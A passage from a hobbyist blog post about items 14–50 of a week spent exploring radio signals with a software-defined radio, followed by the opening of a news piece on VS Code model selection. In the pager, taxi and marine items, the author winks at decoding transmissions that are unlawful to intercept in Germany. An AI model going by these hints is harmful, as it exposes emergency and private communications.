    &lt;p&gt;I spent all Tuesday afternoon and evening learning about satellites. The program gpredict is really nice to find out when satellites will pass overhead! I learned a lot, including that one satellite I was trying to receive burned up last week! :D&lt;/p&gt;
    &lt;p&gt;I was super excited when I first received a signal from a NOAA satellite! ð°ï¸&lt;/p&gt;
    &lt;p&gt;But I didnât manage to decode it properly yet. Maybe my reception was too noisy? I wanted to keep trying, but I had to move on.&lt;/p&gt;
    &lt;head rend="h3"&gt;15: Admire TETRA signals&lt;/head&gt;
    &lt;p&gt;In Germany, the police has switched to an encrypted digital protocol called TETRA.&lt;/p&gt;
    &lt;p&gt;Even though Iâve seen some interesting talks at CCC events about weaknesses in the decryption, all I wanted to do for now is looking at the pretty signals in SDR++. :3&lt;/p&gt;
    &lt;head rend="h3"&gt;16: Listen to taxi dispatchers&lt;/head&gt;
    &lt;p&gt;Again, this is communication not meant for the general public.&lt;/p&gt;
    &lt;p&gt;I didnât listen to someone dispatching taxis to specific addresses, and you also shouldnât do that either. ð&lt;/p&gt;
    &lt;p&gt;Stay away from a site called âfrequenzdatenbankâ!&lt;/p&gt;
    &lt;head rend="h3"&gt;17: Ponder mysterious signals&lt;/head&gt;
    &lt;p&gt;Some of the most fun I had was just browsing frequencies and seeing what I can find! Sometimes, I encountered signals I canât identify.&lt;/p&gt;
    &lt;p&gt;For example, at 865-868 MHz, there was a family of slow, continuous, digital signals that made a nice melody when listened to in single-sideband demodulation!&lt;/p&gt;
    &lt;p&gt;And at 177-180 MHz, there were two very broadband transmissions. Might be TV? But I couldnât find out what type. (It later turned out that Iâd already listened to these signals â it was digital radio, DAB+.)&lt;/p&gt;
    &lt;head rend="h3"&gt;18: Track weather balloons&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 400-405.9 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As I was browsing around for things to receive, I saw on this tracking website that a radiosonde was just launched in Hamburg! SDRangel could decode its transmission! It had climbed to a height of 7 km, and itâs -17 Â°C there!&lt;/p&gt;
    &lt;p&gt;I knew that it would eventually burst and fall back to Earth, and that I could try to get to it and find it!&lt;/p&gt;
    &lt;head rend="h3"&gt;19: Hunt weather balloons!&lt;/head&gt;
    &lt;p&gt;I decided to go on a field trip, using trains and my bike.&lt;/p&gt;
    &lt;p&gt;I was following the tracker. The balloon popped earlier than predicted, and I frantically changed travel plans!&lt;/p&gt;
    &lt;p&gt;Eventually, it landed in a forest. I hoped I could get to it! What made this adventure more tricky was that my mobile Internet contract ran out while I was on the go, and my battery was also almost empty.&lt;/p&gt;
    &lt;p&gt;But I made it to the forest, and entered it.&lt;/p&gt;
    &lt;p&gt;As I circled the site, I encountered a person in their 60s, with a stubbly beard and a blue wool hat. He was looking in the direction of the crash site, and was holding a smartphone, so I asked him whether he also was looking for the radiosonde.&lt;/p&gt;
    &lt;p&gt;He was! We looked for it together for half an hour, jumping over small rivers and crawling through the woods, while he gave me a lot of tips related to hunting sondes.&lt;/p&gt;
    &lt;p&gt;He told me that he had found around 40 of them so far!&lt;/p&gt;
    &lt;p&gt;Usually, the sondes keep broadcasting after landing, but this one wasnât. So he quickly guessed that someone else couldâve taken it. Or maybe it landed in the water and died?&lt;/p&gt;
    &lt;p&gt;Some pictures of the area we searched:&lt;/p&gt;
    &lt;p&gt;Eventually, we gave up, and walked back to our vehicles. He also is an amateur radio operator, and could answer a couple of questions related to building antennas!&lt;/p&gt;
    &lt;p&gt;And he was right: Someone had been faster than us! The status was changed. So in the end, I didnât find the sonde. But something that might be even better â a friend!&lt;/p&gt;
    &lt;head rend="h3"&gt;20: Receive amateur packet radio&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 144.8 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In the 2-meter amateur band, there are certain frequencies for the âAutomatic Packet Reporting Systemâ. Itâs a bit like IP â packets have a âfromâ and a âtoâ. They can also broadcast their position, or weather data.&lt;/p&gt;
    &lt;p&gt;Some stations seem to announce themselves as repeaters, which probably help forward the packets to increase the range.&lt;/p&gt;
    &lt;p&gt;And two people seemed to be on a âfielddayâ, and broadcasted their location. :D&lt;/p&gt;
    &lt;p&gt;SDRangel can create a map automatically:&lt;/p&gt;
    &lt;head rend="h2"&gt;Thursday&lt;/head&gt;
    &lt;p&gt;I started the day by building an antenna!&lt;/p&gt;
    &lt;p&gt;This was going to be a simple ârandom wireâ antenna, to allow me to get better reception in the lower frequencies, which Iâve omitted so far (because I knew it would be much more fun with a better antenna)!&lt;/p&gt;
    &lt;p&gt;I measured out 21.6 m of wire (which for â¨magicâ¨ reasons seem to be a good universal antenna length)â¦&lt;/p&gt;
    &lt;p&gt;â¦directly attached it to the center of another SMA connectorâ¦&lt;/p&gt;
    &lt;p&gt;â¦and draped it all around my room!&lt;/p&gt;
    &lt;p&gt;People on the Internet say that there are many problems with this â that it would be better to have it outside, and that thereâs an impedance mismatch between the receiver and the wire.&lt;/p&gt;
    &lt;p&gt;I could address those problems, but I wanna try how well this works first :)&lt;/p&gt;
    &lt;head rend="h3"&gt;21: Receive Morse code from other countries&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 10.10-10.13 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: CW (âcontinuous waveâ)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;On the 30-meter amateur band, I found people sending Morse code! :O&lt;/p&gt;
    &lt;p&gt;Iâd been learning it a little bit, so if I recorded it and slowed it down, I could understand it: Theyâre sending their callsigns. These are from Belgium, France, and Italy! \o/&lt;/p&gt;
    &lt;p&gt;I compared to my 2-meter dipole antenna, and the reception was definitely better â I can pick up more transmissions, and with much less noise!&lt;/p&gt;
    &lt;head rend="h3"&gt;22: Receive maritime weather reports&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 11.039 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The German Weather Service broadcasts maritime information throughout the day on various shortwave frequencies.&lt;/p&gt;
    &lt;p&gt;They use a protocol called RTTY (radioteletype), and it took me a while to decode it. But I found a neat little program called âfldigiâ: You can pipe audio to it (single side band modulation), and then if you pick the correct settings (see screenshot), it happily transcribes the messages!&lt;/p&gt;
    &lt;p&gt;Hereâs the station weather reports for the Baltic Sea and Northern Sea!&lt;/p&gt;
    &lt;head rend="h3"&gt;23: Receive digimodes from other countries&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 10.130-10.15 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I found some other strange signals on the 30-meter band. The Signal Identification Wiki was really helpful for figuring out what they were: FT8!&lt;/p&gt;
    &lt;p&gt;FT8 is quite a new protocol, invented in 2017, and it seems to be super popular right now! It allows you to transmit short messages, and again, people are looking for people to talk to (CQ), saying how well they receive each other, or saying goodbye (73).&lt;/p&gt;
    &lt;p&gt;This is the WSJT-X software.&lt;/p&gt;
    &lt;head rend="h3"&gt;24: Detect whether your notebook is charging&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: Below 1 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As I was browsing the very low-frequency bands, I had a strange problem: Sometimes, that would work okayish, sometimes I could even make out voices!&lt;/p&gt;
    &lt;p&gt;But other times, it wouldnât work at all, and everything would be loud, angry noise. Even in regions where I had better reception before!&lt;/p&gt;
    &lt;p&gt;Eventually, I found out how to solve that issue â by unplugging my notebook charger. Dâoh! :D&lt;/p&gt;
    &lt;head rend="h3"&gt;25 &amp;amp; 26: See ionosondes and radar signals&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 6-30 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In the low frequencies, occasionally, you can hear a short chirp! :D These are caused by ionosondes, scientific instruments which measure the properties of the ionosphere by sweeping a wide frequency spectrum.&lt;/p&gt;
    &lt;p&gt;Another signal (which I accidentally got in the same screenshot) is a radar system â in this case, according to the Signal Identification Wiki, itâs a âCODARâ system, used to measure the motion of water waves and currents along coasts! :O&lt;/p&gt;
    &lt;head rend="h3"&gt;27: Listen to âsingle side bandâ conversations&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: In all amateur bands, especially the ones below 30 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: SSB (âsingle side bandâ)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How do you transmit speech over long distances? You can use âamplitude modulationâ, where you change the volume of the carrier frequency to model your audio.&lt;/p&gt;
    &lt;p&gt;As a side effect, the bands to the sides of the carrier will contain a signal, as well.&lt;/p&gt;
    &lt;p&gt;One trick is to transmit just those sidebands, which saves power! But you have to âguessâ the base frequency when listening. Depending on which part you transmit, this is called âlower side bandâ or âupper side bandâ.&lt;/p&gt;
    &lt;p&gt;SDR++ makes it very easy to play with this! :) Hereâs someone from Serbia!&lt;/p&gt;
    &lt;head rend="h3"&gt;28: Listen to AM radio from the other side of the world&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: Shortwave bands below 26 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;At night, low-frequency radio waves can travel further around the world, because theyâre reflected by the layers of the ionosphere! Thereâs something magical about this.&lt;/p&gt;
    &lt;p&gt;I put my antenna outside, and I could hear a lot of broadcasting stations! On short-wave.info, you can look up where they are located.&lt;/p&gt;
    &lt;p&gt;Some stations in China are broadcasting with very high power! Some I could hear were over 7500 km away.&lt;/p&gt;
    &lt;p&gt;Wow. Itâs full of stars! ð&lt;/p&gt;
    &lt;head rend="h2"&gt;Friday&lt;/head&gt;
    &lt;p&gt;Originally, I had planned the project to run from Monday to Friday. When I still had 32 things to do in Friday morning, I knew Iâd need to extend it. But I hadnât run out of ideas yet:&lt;/p&gt;
    &lt;head rend="h3"&gt;29: Listen to CB radio&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 26.965-27.405 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: FM or AM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;After Iâd looked into the low frequencies on Thursday, I went to a higher band again: The Citizens Band!&lt;/p&gt;
    &lt;p&gt;This is the third frequency band Iâm aware of where anyone is allowed to transmit â provided that you use a licensed device!&lt;/p&gt;
    &lt;p&gt;This is a band where my random wire antenna really came in handy. Without it, I would have had a hard time understanding anything. And even with it, transmissions are extremely noisy.&lt;/p&gt;
    &lt;p&gt;CB radio is used internationally, especially by truck drivers, it seems.&lt;/p&gt;
    &lt;head rend="h3"&gt;30: Assess the propagation of radio waves using beacons&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 14.100, 18.110, 21.150, 24.930, and 28.200 MHz&lt;/item&gt;
      &lt;item&gt;Modulation: CW&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The International Beacon Project runs a network of 18 stations, which take turns transmitting their callsigns at certain frequencies.&lt;/p&gt;
    &lt;p&gt;Using this system, you can quickly get a sense of how well radio waves are currently propagating to your location. Clever!&lt;/p&gt;
    &lt;p&gt;I picked up the beacon from southern Finland! You can see its callsign scrolling away in the video. Itâs followed by four dashes send with decreasing power. I only heard the first oneâ¦&lt;/p&gt;
    &lt;head rend="h3"&gt;31: Receive a time signal&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 9996 kHz&lt;/item&gt;
      &lt;item&gt;Modulation: CW&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I wouldâve loved to receive DCF77, which powers the radio clocks in Germany! But no matter how hard I listened to 77.5 kHz, there was nothing there. I donât think my dongle can do that.&lt;/p&gt;
    &lt;p&gt;So I used higher frequencies! Russia transmits its âRWMâ time signal at 9996 kHz, which beeps every second, with a long beep for the full minute.&lt;/p&gt;
    &lt;p&gt;Not enough to tell the time, but enough to adjust your wrist watch, I guess!&lt;/p&gt;
    &lt;head rend="h3"&gt;32: Receive a weather fax&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 3855, 7880, and 13882.5 kHz (see weatherfax.com for more)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The German Weather Service broadcasts weather maps throughout the day! You can decode them using fldigiâs âWEFAX-576â setting.&lt;/p&gt;
    &lt;p&gt;I caught this one only halfway through. According to the schedule, itâs the âSurface weather chart North Atlantic, Europeâ!&lt;/p&gt;
    &lt;p&gt;If you squint really hard, you can make out the coast of Spain and the Mediterranean Sea on the right side!&lt;/p&gt;
    &lt;head rend="h3"&gt;33: Decode images from a weather satellite!&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 137.62, 137.9125, and 137.1 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I couldnât stop trying to capture a weather satellite, itâs just too cool to receive an image from space!&lt;/p&gt;
    &lt;p&gt;That evening, an American satellite called NOAA-15 passed right over us, so I thought Iâd try again. And this time, I got parts of an image! \o/&lt;/p&gt;
    &lt;p&gt;This is real-time data! At night, both transmitted images are infrared recordings.&lt;/p&gt;
    &lt;p&gt;I recorded the FM signal using SDR++, and then decoded the image using noaa-apt, which also added country outlines.&lt;/p&gt;
    &lt;head rend="h3"&gt;34: Estimate the speed of satellites&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 136-138 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Hereâs what the NOAA-15 weather satellite sounds like, by the way! tick-tock&lt;/p&gt;
    &lt;p&gt;While recording, I noticed something strange: The transmission didnât happen at the frequency I had expected it to! And also, the frequency changed.&lt;/p&gt;
    &lt;p&gt;Then it hit me: Doppler effect! At the time of the recording, the frequency was around 4250 Hz higher than expected.&lt;/p&gt;
    &lt;p&gt;After looking up the formula, I calculated a relative speed of 9 km/s! (Which got close to its real speed, 7.5 km/s.)&lt;/p&gt;
    &lt;head rend="h3"&gt;35: Listen to number stations&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 5-30 MHz?&lt;/item&gt;
      &lt;item&gt;Modulation: Differs by station&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These stations send encrypted messages using number sequences, possibly for espionage purposes!&lt;/p&gt;
    &lt;p&gt;So why not listen to one? Thereâs a surprisingly well-maintained database of them on a site call Priyom.&lt;/p&gt;
    &lt;p&gt;So I tuned into the next frequency that was listed, and: Bingo!&lt;/p&gt;
    &lt;p&gt;Allegedly, this was a station in Moscow. That day, it sent â218, 218, 218â in a loop, followed by three long beeps, which is the format of a ânull messageâ.&lt;/p&gt;
    &lt;p&gt;So no news for the Russian spies.&lt;/p&gt;
    &lt;head rend="h2"&gt;Saturday&lt;/head&gt;
    &lt;p&gt;The week was really intense for me. Initially, I thought Iâd do 10 things per day, but it turned out that that was too much. I had to learn so many new things.&lt;/p&gt;
    &lt;p&gt;Many things I tried donât work on my first attempt. Finding LoRaWAN signals, decoding packet radio, finding something on PMR446, decoding the satellite â those were all things that required a second (or third) attempt.&lt;/p&gt;
    &lt;p&gt;This project was exhausting, but also joyful â having committed to it, I got in a nice flow state, where I could focus on it for hours.&lt;/p&gt;
    &lt;p&gt;Often, I thought: âOkay, this is it. I canât possibly find more things.â But this is the power of the 50 Things technique: I have to keep looking, leave my comfort zone, be creative, try things I otherwise wouldnât have tried!&lt;/p&gt;
    &lt;p&gt;So, 15 more things, huh?&lt;/p&gt;
    &lt;head rend="h3"&gt;36: Receive images from amateur radio operators&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 14.230, 14.233, 21.340, 28.680, 145.625 MHz seem to be popular&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Using a protocol called âSSTVâ (slow-scan television), amateur radio operators send each other postcards! :D&lt;/p&gt;
    &lt;p&gt;Iâve been browsing the usual frequencies, and tried to decode images using the software QSSTV on Linux. And I accidentally caught a piece of what seems to be a test image!&lt;/p&gt;
    &lt;p&gt;SSTV has the prettiest noise! :3&lt;/p&gt;
    &lt;head rend="h3"&gt;37: Listen to The Buzzer&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 4625 kHz&lt;/item&gt;
      &lt;item&gt;Modulation: Upper side band&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thereâs a mysterious Russian station broadcasting at 4625 kHz. Sometimes, it sends encrypted voice messages.&lt;/p&gt;
    &lt;p&gt;But usually, all it does is send a honking sound every two seconds, to deter other stations from using the same frequency.&lt;/p&gt;
    &lt;p&gt;The purpose of the station is unclear, but most theories think itâs military communication.&lt;/p&gt;
    &lt;head rend="h3"&gt;38: Catch a LoRaWAN chirp&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 868.1-868.5 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This was a bit like trying to catch a rare insect! ð&lt;/p&gt;
    &lt;p&gt;LoRaWAN is a low-power, wide-area networking protocol, intended for âInternet of Thingsâ applications.&lt;/p&gt;
    &lt;p&gt;You can see transmission in the lower half of the screenshot! It has a very cute structure: You can see eight âdown-chirpsâ, followed by two âup-chirpsâ. Thatâs the header, followed by the payload.&lt;/p&gt;
    &lt;p&gt;To look for the signal, I made a âbaseband captureâ in SDR++, and opened the recording in Sonic Visualizer.&lt;/p&gt;
    &lt;head rend="h3"&gt;39: Read data from utility meters&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 868.95 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Devices like smoke detectors or meters for water or heat are sending their readings via a protocol called Wireless M-Bus.&lt;/p&gt;
    &lt;p&gt;Again, I was surprised by how many devices seem to be around! Thanks for the tip, @envy :)&lt;/p&gt;
    &lt;p&gt;wmbusmeters is a really nice tool for decoding the messages.&lt;/p&gt;
    &lt;head rend="h3"&gt;40: âWatchâ TV&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 174-786 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The chips in my SDR stick are also being used in DVB-T dongles! So, can we watch TV? Unfortunately, no.&lt;/p&gt;
    &lt;p&gt;From what I pieced together, thereâs a difference between using the stick in SDR mode (where it sends the full spectrum), and in TV mode (where it sends the decoded video).&lt;/p&gt;
    &lt;p&gt;In Germany, thereâs now DVB-T2, which my hardware doesnât support in TV mode. And in SDR mode, the bandwidth is too narrow for DVB-T2. But we can scroll over a channel and look at it! :3&lt;/p&gt;
    &lt;head rend="h3"&gt;41: Track cars and buses&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 433.05-434.79 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Did a little walk to a big intersection, to see what âdevice signalsâ Iâd find there at 433 MHz.&lt;/p&gt;
    &lt;p&gt;I could confirm that the IBIS beacons are in fact being sent by buses! The included âvehicle IDâ even matches the white number thatâs printed on it.&lt;/p&gt;
    &lt;p&gt;I also saw some messages from tire pressure monitoring systems in cars! They also include an ID, and usually, the brand of the car! The owners probably arenât aware how easy it would be to track themâ¦ (Thanks, @scy!)&lt;/p&gt;
    &lt;p&gt;Side note: I wonder why some signals in that band are warped like the one at 433.96 MHz here!&lt;/p&gt;
    &lt;p&gt;At first, I thought âAh, Doppler effect again, itâs coming from a moving car!â But if thatâd be the case, that car would be moving at over 700 m/sâ¦&lt;/p&gt;
    &lt;p&gt;Friends later suspected that this effect is due to weak batteries affecting the crystal in the sending devices, or temperature changes.&lt;/p&gt;
    &lt;head rend="h3"&gt;42: Receive Morse code from a satellite!&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 145.860 (status information) and 145.960 (beacon)&lt;/item&gt;
      &lt;item&gt;Modulation: CW&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So I caught a satellite again! :D This time, it was school project, the Italian satellite âMax Valierâ. It continuously sends Morse code on a beacon frequency.&lt;/p&gt;
    &lt;p&gt;Pretty weak signal, but hereâs what I could hear:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;
3MV MAX VALIER SAT ... MANFRED ES CHRISTA FUKSE 73 ... II3MV ...
&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;Super happy about this! I got both the name of the satellite, as well as its callsign at the end, and what seems to be some kind of greeting? I later learned that &lt;code&gt;ES&lt;/code&gt; is Morse code shorthand for âandâ, and that Manfred and Christa Fuchs were the founders of a company that helped launch the satellite!&lt;/p&gt;
    &lt;p&gt;(Thanks for the tip, @manawyrm!)&lt;/p&gt;
    &lt;head rend="h3"&gt;43: Receive emergency service pagers&lt;/head&gt;
    &lt;p&gt;This is another thing thatâs not allowed in Germany, so you shouldnât do it.&lt;/p&gt;
    &lt;p&gt;Pagers use a format called âPOCSAGâ (Post Office Code Standardisation Advisory Groupâ¦), which you should not decode using multimon-ng.&lt;/p&gt;
    &lt;p&gt;Because you would find that the content is short and cryptic anyway. It would probably be repeated by several stations all around you, to make sure the whole region is covered.&lt;/p&gt;
    &lt;p&gt;Do not read the English Wikipedia page! It contains frequencies!&lt;/p&gt;
    &lt;head rend="h2"&gt;Sunday&lt;/head&gt;
    &lt;p&gt;At this point, I was pretty tired. Focusing on this project for 6 days straight took a lot of energy, and I was always uncertain if I could actually complete all 50 things in that week! But I woke up with a fun idea:&lt;/p&gt;
    &lt;head rend="h3"&gt;44: Detect when a smartphone is turned on&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 13.56 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I was curious whether I could see the NFC transceiver in my smartphone! And yeah, especially using my random wire antenna, this works really well!&lt;/p&gt;
    &lt;p&gt;My smartphone seems to emit at the NFC frequency a couple of times per second. And when unlocking the screen, it emits five very strong beeps on that frequency! I can see those from the other side of our apartment.&lt;/p&gt;
    &lt;p&gt;Surely, these signals are the same for every device, right? ð¶&lt;/p&gt;
    &lt;p&gt;Observe the five beeps here:&lt;/p&gt;
    &lt;head rend="h3"&gt;45: Communicate wirelessly usingâ¦ a book&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 13.56 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Piko and I played around with NFC a bit more, and we found out that when getting close to an NFC tag, a smartphone emits at 13.56 MHz continuously!&lt;/p&gt;
    &lt;p&gt;So, we started sending Morse code to each other between rooms, using a smartphone and a library book! :âD&lt;/p&gt;
    &lt;p&gt;Take that, Bundesnetzagentur!&lt;/p&gt;
    &lt;p&gt;Seems that the shortest signal you can create is 0.7 s long, resulting in a meager communication speed of 3-4 words per minuteâ¦&lt;/p&gt;
    &lt;head rend="h3"&gt;46: Receive navigational aids for airplanes&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 108.00-117.95 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;There are ground stations that emit a signal that allow calculating your angle relative to it! If you receive two, you can determine your position. (Thanks, @fly_it!)&lt;/p&gt;
    &lt;p&gt;I heard the one close to Hamburg! And SDRangel has a decoder, of course! It calculated angles between 210Â° and 230Â°, which is pretty close to the actual value of 224Â°! I donât think they are meant to be used from the ground.&lt;/p&gt;
    &lt;p&gt;The neat navigational map is from https://skyvector.com!&lt;/p&gt;
    &lt;p&gt;I spent ages trying to build my own decoder in GNU Radio. But I wasnât familiar with it at all, and I eventually gave up. Still, that seems to be the software you wanna learn for tasks like these!&lt;/p&gt;
    &lt;p&gt;By the way, how the ground stations work is fascinating: In my case, itâs a âDoppler VORâ: It transmits a static frequency via amplitude modulation, and adds another signal that moves around in circles, so you get a Doppler frequency shift.&lt;/p&gt;
    &lt;p&gt;If you compare the two, you can calculate the angle!&lt;/p&gt;
    &lt;head rend="h3"&gt;47: See how low you can go in the frequency spectrum&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Modulation: mostly AM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This was a fun exploration: Whatâs the lowest-frequency broadcast I can receive?&lt;/p&gt;
    &lt;p&gt;The RTL-SDR Blog V4 stick Iâm using has a neat feature â a built-in âupconverterâ, which is enabled automatically when you try to listen to frequencies below what the chipset supports. This allows it to receive down to ~500 kHz!&lt;/p&gt;
    &lt;p&gt;The first stations that are comprehensible started at 1 MHz for me.&lt;/p&gt;
    &lt;head rend="h3"&gt;48: See how high you can go in the frequency spectrum&lt;/head&gt;
    &lt;p&gt;The chipset in my SDR stick go up to maximum frequency of 1766 MHz. It seems pretty quiet up there, probably because I lack proper antennas. I found these three lines in an amateur band, but they probably originate from the stick itself, or another device.&lt;/p&gt;
    &lt;p&gt;So the highest-frequency thing Iâve received is ADS-B at 1090 MHz (see entry #5)! ð&lt;/p&gt;
    &lt;head rend="h3"&gt;49: Listen to marine radio&lt;/head&gt;
    &lt;p&gt;Weâve been over this. Not allowed in Germany. Donât do it. â&lt;/p&gt;
    &lt;p&gt;But if youâre in the US, anyone can purchase a marine radio, and even use it to transmit! :D&lt;/p&gt;
    &lt;head rend="h3"&gt;50: Go mobile!&lt;/head&gt;
    &lt;p&gt;Just now, I was wondering whether there are any Android apps for controlling SDRs.&lt;/p&gt;
    &lt;p&gt;And it turned out, the software I liked best that week, SDR++, had an Android version since a couple of weeks! \o/&lt;/p&gt;
    &lt;p&gt;So now I could go track down the source of some of these strange signals! :3&lt;/p&gt;
    &lt;head rend="h2"&gt;Looking back&lt;/head&gt;
    &lt;p&gt;And with that, â¦ ð¥ â¦ I was officially done with my â50 things to do with a software defined radioâ! ð&lt;/p&gt;
    &lt;p&gt;This were seven very intense days, where I learned a lot of new things about radio waves and the many things they can be used for!&lt;/p&gt;
    &lt;p&gt;I was proud! I was tired! I was amazed that all those things I received are all around us, everywhere, all at once â if you know where to look. :O&lt;/p&gt;
    &lt;head rend="h2"&gt;More things to explore&lt;/head&gt;
    &lt;p&gt;Hereâs some things that I havenât tried or that havenât worked:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Receiving digital voice modes (SDRangel should be able to do it, but I couldnât figure it out)&lt;/item&gt;
      &lt;item&gt;Receive something from the ISS&lt;/item&gt;
      &lt;item&gt;Use the GRAVES radar to detect meteors (couldnât detect it)&lt;/item&gt;
      &lt;item&gt;Receive videos on ham bands&lt;/item&gt;
      &lt;item&gt;Receive Iridium satellites&lt;/item&gt;
      &lt;item&gt;Listen to pirate stations&lt;/item&gt;
      &lt;item&gt;Receive Cubesat&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Also, doing things with Wi-Fi/Bluetooth/Zigbee could be fun, but Iâd need a more expensive receiver for those frequencies.&lt;/p&gt;
    &lt;head rend="h2"&gt;Future thoughts&lt;/head&gt;
    &lt;p&gt;So, was this project in fact a gateway drug to getting an amateur radio license?&lt;/p&gt;
    &lt;p&gt;Yeah, probably. Iâd love to transmit something and experiment more! :D&lt;/p&gt;
    &lt;p&gt;In Germany, a new license class will be introduced in summer 2024, thatâll allow you to send on the 10-meter, 2-meter and 70-cm bands (the âN classâ).&lt;/p&gt;
    &lt;p&gt;In fact, thereâs a really good German online course that teaches you everything you need to know: 50ohm.de&lt;/p&gt;
    &lt;p&gt;Highly recommended, even if youâre not planning on getting a license.&lt;/p&gt;
    &lt;p&gt;Finally, thanks to Piko, Chris, and Cqoicebordel for proof-reading this blog post! &amp;lt;3&lt;/p&gt;
    &lt;head rend="h2"&gt;Join the discussion!&lt;/head&gt;
    &lt;p&gt;You can add your comment in the Fediverse! Alternatively, drop me a mail at mail@blinry.org. Also, you can support me on Patreon or subscribe to my newsletter&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blinry.org/50-things-with-sdr/"/><published>2025-09-16T14:35:19+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45263063</id><title>Microsoft Favors Anthropic over OpenAI for Visual Studio Code</title><updated>2025-09-16T16:11:52.279233+00:00</updated><content>&lt;doc fingerprint="2d570f1cf69ecadb"&gt;
  &lt;main&gt;
    &lt;p&gt;Microsoft is adding automatic AI model selection to its Visual Studio Code editor that will automatically pick the best model for “optimal performance.” This new auto model feature will select between Claude Sonnet 4, GPT-5, GPT-5 mini and other models for GitHub Copilot free users, but paid users will “primarily rely on Claude Sonnet 4.”&lt;/p&gt;
    &lt;head rend="h1"&gt;Microsoft favors Anthropic over OpenAI for Visual Studio Code&lt;/head&gt;
    &lt;p&gt;Visual Studio Code now has a new auto AI model selector that favors Claude 4 over GPT-5.&lt;/p&gt;
    &lt;p&gt;Visual Studio Code now has a new auto AI model selector that favors Claude 4 over GPT-5.&lt;/p&gt;
    &lt;p&gt;It’s a tacit admission from Microsoft that the software maker is favoring Anthropic’s AI models over OpenAI’s latest GPT-5 models for coding and development. Sources familiar with Microsoft’s developer plans tell me that the company has been instructing its own developers to use Claude Sonnet 4 in recent months.&lt;/p&gt;
    &lt;p&gt;“Based on internal benchmarks, Claude Sonnet 4 is our recommended model for GitHub Copilot,” said Julia Liuson, head of Microsoft’s developer division, in an internal email in June. While that guidance was issued ahead of the GPT-5 release, I understand Microsoft’s model guidance hasn’t changed.&lt;/p&gt;
    &lt;p&gt;Microsoft is also making “significant investments” in training its own AI models. “We’re also going to be making significant investments in our own cluster. So today, MAI-1-preview was only trained on 15,000 H100s, a tiny cluster in the grand scheme of things,” said Microsoft AI chief Mustafa Suleyman, in an employee-only town hall last week.&lt;/p&gt;
